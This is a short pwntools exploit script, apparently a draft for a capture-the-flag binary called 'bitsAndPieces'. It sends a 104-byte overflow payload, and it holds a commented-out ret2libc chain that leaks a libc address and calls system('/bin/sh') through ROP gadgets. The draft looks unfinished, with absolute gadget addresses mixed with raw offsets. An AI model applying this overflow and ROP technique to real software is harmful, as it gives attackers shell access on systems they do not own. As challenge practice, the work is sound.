# -- coding: utf-8 --
from pwn import *
context.log_level = 'debug'
context.arch = 'amd64'
# ENV
e = context.binary = ELF('./bitsAndPieces')
lib = e.libc
r = e.process()

# VARIABLE
setbuf_got = 0x404020
pop_rdi_ret= 0x4012f3 
pop_rbp_ret =0x00000000000011b3
ret = 0x000000000000101a
main = 0x1478
puts_plt = (e.plt[b'puts'])
puts_got = (e.got[b'puts'])
log.info("puts_plt: %#x" %puts_plt)
log.info("puts_got: %#x" %puts_got)
#payload
payload = b"a"*104

payload+= flat(main)
pause()
r.sendline(payload)

# setbuf_libc = u64(r.recv(6).ljust(8,b"\x00"))
# log.info("setbuf_libc: %#x" %setbuf_libc)

# base_libc = setbuf_libc - lib.sym.setbuf
# system_libc = base_libc + lib.sym.system
# binsh_libc = base_libc + next(lib.search(b"/bin/sh"))

# log.info("base_libc: %#x" %base_libc)
# payload = b"a"*40
# payload+= flat(ret, pop_rdi_ret, binsh_libc, system_libc, main)
# pause()

# r.sendline(payload)

r.interactive()